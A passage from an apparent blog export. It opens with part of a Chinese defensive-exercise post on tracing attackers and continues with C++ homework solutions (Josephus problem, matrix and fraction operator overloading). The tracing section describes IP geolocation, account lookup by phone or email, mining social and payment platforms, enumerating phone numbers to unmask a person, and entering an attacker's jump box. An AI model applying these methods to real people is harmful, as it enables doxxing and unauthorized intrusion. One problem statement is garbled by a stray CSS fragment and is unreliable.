样本溯源</h3><p>原理：恶意样本溯源分析的前提是针对样本，然后进行对样本做逆向分析、网络行为分析、日志行为分析。挖掘出恶意样本的攻击者或者团队的意图。</p><p>方式：</p><p><strong>同源分析：</strong>通过利用恶意样本间的同源关系，挖掘出可溯源痕迹，并根据它们出现的前后关系判定变体来源。恶意代码同源性分析，其目的是判断不同的恶意代码是否源自同一套恶意代码或是否由同一个作者、团队编写，其是否具有内在关联性、相似性。从溯源目标上来看，可分为恶意代码家族溯源及作者溯源。</p><p><strong>家族溯源：</strong>恶意样本的家族变体是已有恶意代码在不断的对抗或功能进化中生成的新型恶意样本，针对变体的家族溯源是通过提取其特征数据及代码片段，分析它们与已知样本的同源关系，进而推测可疑恶意样本的家族。例如，Kinable等人提取恶意代码的系统调用图，采用图匹配的方式比较恶意代码的相似性，识别出同源样本，进行家族分类。</p><p><strong>作者溯源：</strong>恶意样本的作者溯源就是通过分析和提取恶意样本中的相关特征，定位出恶意样本作者相关特征，揭示出样本间的同源关系，进而溯源到已知的作者或组织。例如，Gostev等通过分析Stuxnet与Duqu所用的驱动文件在编译平台、时间、代码等方面的同源关系，实现了对它们作者的溯源。</p><p>步骤流程：</p><p><strong>1、信息查询</strong>：针对可溯源的IP或域名通过网络上<strong>开放威胁情报平台</strong>进行查询</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></p><p><a href="https://ti.360.cn/">https://ti.360.cn/</a></p><p><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></p><p><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></p><p><strong>//ip查域名</strong></p><p><a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a></p><p><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></p><p><a href="https://www.whois.com/">https://www.whois.com/</a></p><p><strong>//IP定位</strong></p><p><a href="https://chaipip.com/">https://chaipip.com/</a></p><p><a href="https://www.opengps.cn/Data/IP/ipplus.aspx">https://www.opengps.cn/Data/IP/ipplus.aspx</a></p><p><strong>//查询邮箱或手机注册过的网站</strong></p><p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p><p><strong>2、定位目标：</strong>利用精准IP定位，进行IP目标位置的确定</p><p><strong>3、收集互联网信息侧的用户ID</strong></p><p>可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。</p><p><strong>4、进入跳板机收集信息</strong></p><p>如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等</p><h3 id="7-手机号利用"><a href="#7-手机号利用" class="headerlink" title="7. 手机号利用"></a>7. 手机号利用</h3><p>知道用来注册平台后的材料后再根据这两点枚举出来所有可能性的手机号，比如我的归属地在北京 手机号前三位是150，那么可以列出所有可能性，并且这个可能性不会像爆破密码那么离谱，都在一个可验证的范围，而且还有接口可以排除掉空号、不存在号，如果有的网站可以给出后面几位手机号，那么其实可挑选的范围是非常小的。</p><p>如果知道运营商信息还可以进一步缩小，之后再导入微信 QQ等社交平台（搜索手机号加好友、可能认识的人功能）验证 ID，如果有相同 ID 的或者行业相关 ID 即可关联出手机号，如果没关联出也没有关系，还可以去行业内的平台进行验证。</p>]]></content>
      
      
      <categories>
          
          <category> 护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 护网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约瑟夫问题</title>
      <link href="/post/3d3935c8.html"/>
      <url>/post/3d3935c8.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>急匆匆写的，写的很烂将就看看~_~</p><h3 id="【问题描述】"><a href="#【问题描述】" class="headerlink" title="【问题描述】"></a>【问题描述】</h3><p>约瑟夫问题：n个骑士编号1，2，…，n，围坐在圆桌旁。编号为1的骑士从1开始报数，报到m的骑士出列，然后下一个位置再从1开始报数，找出最后留在圆桌旁的骑士编号。</p><h3 id="【输入形式】"><a href="#【输入形式】" class="headerlink" title="【输入形式】"></a>【输入形式】</h3><p>程序参考的输入（数字前为提示文字）：</p><p>Input n and m:7 3</p><h3 id="【输出形式】"><a href="#【输出形式】" class="headerlink" title="【输出形式】"></a>【输出形式】</h3><p>Result:4</p><h3 id="【样例输入】"><a href="#【样例输入】" class="headerlink" title="【样例输入】"></a>【样例输入】</h3><p>Input n and m:7 3</p><h3 id="【样例输出】"><a href="#【样例输出】" class="headerlink" title="【样例输出】"></a>【样例输出】</h3><p>Result:4</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a;</span><br><span class="line">    <span class="type">int</span> n,m,x=<span class="number">0</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input n and m:&quot;</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    a.<span class="built_in">resize</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]=i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator i = a.<span class="built_in">begin</span>();</span><br><span class="line">        n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (a.<span class="built_in">size</span>() != <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == a.<span class="built_in">end</span>())</span><br><span class="line">                i = a.<span class="built_in">begin</span>();</span><br><span class="line">            n++;</span><br><span class="line">            <span class="keyword">if</span> (n == m)</span><br><span class="line">            &#123;</span><br><span class="line">                i = a.<span class="built_in">erase</span>(i);</span><br><span class="line">                n = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Result:&quot;</span>&lt;&lt;a[<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态二维数组实现*=、+=、=重载运算</title>
      <link href="/post/cdd48e1f.html"/>
      <url>/post/cdd48e1f.html</url>
      
        <content type="html"><![CDATA[<h3 id="【问题描述】"><a href="#【问题描述】" class="headerlink" title="【问题描述】"></a>【问题描述】</h3><p>编写一个程序，定义一个安全、动态二维double型的数组类Matrix。</p><ul><li>实现Matrix table(row,col)定义row行col列的二维数组, row和col为正整数；</li><li>实现table(i,j)访问table的第i行第j列的元素，行号和列号从0开始；</li><li>实现Matrix的输入输出(&gt;&gt;、&lt;&lt;)；</li><li>实现矩阵加等、乘等运算(+=、<em>=)，例：Matrix&amp; operator+=(const Matrix&amp;); Matrix&amp; operator</em>=(const Matrix&amp;)；</li><li>实现矩阵的赋值运算(=)，例：Matrix&amp; operator=(const Matrix&amp;)。</li></ul><h3 id="【输入形式】"><a href="#【输入形式】" class="headerlink" title="【输入形式】"></a><strong>【输入形式】</strong></h3><ul><li>第一行table1的行列值row1和col1，空格分隔；</li><li>第二行table1的初始化值，共row1*col1个数据，空格分隔；</li><li>第三行table2的行列值row2和col2，空格分隔；</li><li>第四行table2的初始化值，共row2*col2个数据，空格分隔；</li></ul><h3 id="【输出形式】"><a href="#【输出形式】" class="headerlink" title="【输出形式】"></a>【输出形式】</h3><ul><li>Matrix的输出格式为row行col列, 数据空格分隔；</li><li>若table1和table2不满足矩阵的加法和乘法运算规则，输出ERROR!；</li><li>依次输出以下表达式的值,每个输出间隔一行；</li><li>table1(row1/2,col1/2)；</li><li>table1 *= table2；</li><li>table1 += table2；</li><li>table1 = table2。</li></ul><h3 id="【样例输入1】"><a href="#【样例输入1】" class="headerlink" title="【样例输入1】"></a>【样例输入1】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 3</span><br><span class="line">1 1 1  </span><br><span class="line">2 3</span><br><span class="line">2 2 2 2 2 2</span><br></pre></td></tr></table></figure><h3 id="【样例输出1】"><a href="#【样例输出1】" class="headerlink" title="【样例输出1】"></a>【样例输出1】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">ERROR! </span><br><span class="line">ERROR!</span><br><span class="line">2 2 2</span><br><span class="line">2 2 2</span><br></pre></td></tr></table></figure><h3 id="【样例输入2】"><a href="#【样例输入2】" class="headerlink" title="【样例输入2】"></a>【样例输入2】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2 3</span><br><span class="line">1 1 1 1 1 1</span><br><span class="line">3 2</span><br><span class="line">2 2 2 2 2 2</span><br></pre></td></tr></table></figure><h3 id="【样例输出2】"><a href="#【样例输出2】" class="headerlink" title="【样例输出2】"></a>【样例输出2】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6 6</span><br><span class="line">6 6</span><br><span class="line">ERROR!</span><br><span class="line">2 2</span><br><span class="line">2 2</span><br><span class="line">2 2</span><br></pre></td></tr></table></figure><h3 id="【样例输入3】"><a href="#【样例输入3】" class="headerlink" title="【样例输入3】"></a>【样例输入3】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2 2</span><br><span class="line">1 1 1 1 </span><br><span class="line">2 2</span><br><span class="line">1 0 0 1</span><br></pre></td></tr></table></figure><h3 id="【样例输出3】"><a href="#【样例输出3】" class="headerlink" title="【样例输出3】"></a>【样例输出3】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1 1</span><br><span class="line">1 1</span><br><span class="line">2 1</span><br><span class="line">1 2</span><br><span class="line">1 0</span><br><span class="line">0 1</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span>  std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Matrix</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Matrix</span>(<span class="type">int</span> a, <span class="type">int</span> b) : <span class="built_in">a</span>(a), <span class="built_in">b</span>(b) &#123;&#125;</span><br><span class="line">    <span class="built_in">Matrix</span>() &#123;&#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; num; <span class="comment">// 矩阵</span></span><br><span class="line">    <span class="type">int</span> a, b;   <span class="comment">// a-&gt;行；b-&gt;列</span></span><br><span class="line">    <span class="keyword">friend</span> istream &amp;<span class="keyword">operator</span>&gt;&gt;(istream &amp;in, Matrix &amp;m);</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;out, Matrix &amp;m);</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">int</span> <span class="keyword">operator</span>*=(Matrix&amp; m1, Matrix&amp; m2);</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">int</span> <span class="keyword">operator</span>+=(Matrix&amp; m1, Matrix&amp; m2);</span><br><span class="line">    Matrix&amp; <span class="keyword">operator</span>=(Matrix&amp; m2);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">istream &amp;<span class="keyword">operator</span>&gt;&gt;(istream &amp;in, Matrix &amp;x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">double</span> num;</span><br><span class="line">    vector&lt;<span class="type">double</span>&gt; temp;</span><br><span class="line">    in &gt;&gt; x.a &gt;&gt; x.b;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; x.a; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        temp.<span class="built_in">clear</span>();   <span class="comment">// 注意每输入一行应该清空temp</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x.b; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            in &gt;&gt; num;</span><br><span class="line">            temp.<span class="built_in">push_back</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        x.num.<span class="built_in">push_back</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;out, Matrix &amp;x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; x.a; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x.b; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; x.num[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Matrix::operator</span><span class="params">()</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num[a / <span class="number">2</span>][b / <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="keyword">operator</span>*=(Matrix &amp;m1, Matrix &amp;m2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">double</span> temp_n = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">double</span>&gt; temp;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; num; <span class="comment">// 暂存结果，防止破坏m1的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m1.b != m2.a)   <span class="comment">// 相乘条件：前一个矩阵的列数=后一个矩阵的行数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;   <span class="comment">// 返回1表示无法执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m1.a; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            temp.<span class="built_in">clear</span>();   <span class="comment">// 注意每输入一行应该清空temp</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m2.b; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                temp_n = <span class="number">0</span>; <span class="comment">// 注意每输入一个数字应该置零temp_n</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; m1.b; ++k)</span><br><span class="line">                    temp_n += m1.num[i][k] * m2.num[k][j];</span><br><span class="line">                temp.<span class="built_in">push_back</span>(temp_n);</span><br><span class="line">            &#125;</span><br><span class="line">            num.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    m1.num.<span class="built_in">swap</span>(num);</span><br><span class="line">    m1.b = m2.b;    <span class="comment">// 结果的行数就是前一个矩阵的行数，所以只需要修改列数即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="keyword">operator</span>+=(Matrix &amp;m1, Matrix &amp;m2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m1.a != m2.a || m1.b != m2.b)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m1.a; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m1.b; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                m1.num[i][j] += m2.num[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Matrix&amp; Matrix::<span class="keyword">operator</span>=(Matrix &amp;m2)</span><br><span class="line">&#123;</span><br><span class="line">    a = m2.a;</span><br><span class="line">    b = m2.b;</span><br><span class="line">    num.<span class="built_in">clear</span>();</span><br><span class="line">    vector&lt;<span class="type">double</span>&gt; temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; a; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        temp.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; b; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            temp.<span class="built_in">push_back</span>(m2.num[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        num.<span class="built_in">push_back</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Matrix m1, m2;</span><br><span class="line">    cin &gt;&gt; m1;</span><br><span class="line">    cin &gt;&gt; m2;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="built_in">m1</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(m1 *= m2))</span><br><span class="line">        cout &lt;&lt; m1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;ERROR!&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(m1 += m2))</span><br><span class="line">        cout &lt;&lt; m1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;ERROR!&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    m1 = m2;</span><br><span class="line">    cout &lt;&lt; m1;</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分数四则运算之运算符重载</title>
      <link href="/post/c1da8047.html"/>
      <url>/post/c1da8047.html</url>
      
        <content type="html"><![CDATA[<p><strong>【问题】</strong></p><p>xxxxxxxxxx22 1/<em> 分类页样式 began </em>/2.category-list-link:hover{3  transform: scale(1.1);4  box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);5  border-radius: 15px;6  padding: 6px 16px;7  margin-left: 0px;8  font-size: 16px;9  transition-duration: 0.15s;10  //display:flex;11}12a.category-list-link:before{13  top: 10px;14  width: 18px;15  height: 18px;16  content: “📚”;17  margin-right: 5px;18  font: normal normal normal 14px/1 FontAwesome;19  font-size: 15px;20  line-height: 18px;21}22/<em> 分类页样式 end </em>/css</p><p>（1）输出结果是最简分数（可以是带分数）；</p><p>（2）分母为1，只输出分子。</p><p><strong>【输入形式】</strong></p><p>提示“Input x: ”，输入第一个分数。如：1/6</p><p>提示“Input y: ”，输入第二个分数。如：2/9</p><p><strong>【输出形式】</strong></p><p>提示并输出+、-、*、/的结果，如</p><p>x+y=7/18</p><p>x-y=-1/18</p><p>x*y=1/27</p><p>x/y=3/4</p><p><strong>【样例输入】</strong></p><p>Input x: 1/6</p><p>Input y: 2/9</p><p><strong>【样例输出】</strong></p><p>x+y=7/18</p><p>x-y=-1/18</p><p>x*y=1/27</p><p>x/y=3/4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span>  std;</span><br><span class="line"><span class="keyword">class</span>  <span class="title class_">CFraction</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span>  nume;    <span class="comment">//  分子</span></span><br><span class="line">    <span class="type">int</span>  deno;    <span class="comment">//  分母</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CFraction</span>(<span class="type">int</span>  nu = <span class="number">0</span>, <span class="type">int</span>  de = <span class="number">1</span>) :<span class="built_in">nume</span>(nu), <span class="built_in">deno</span>(de) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">simplify</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输入输出的重载</span></span><br><span class="line">    <span class="keyword">friend</span>  istream &amp;<span class="keyword">operator</span>&gt;&gt;(istream &amp;in, CFraction 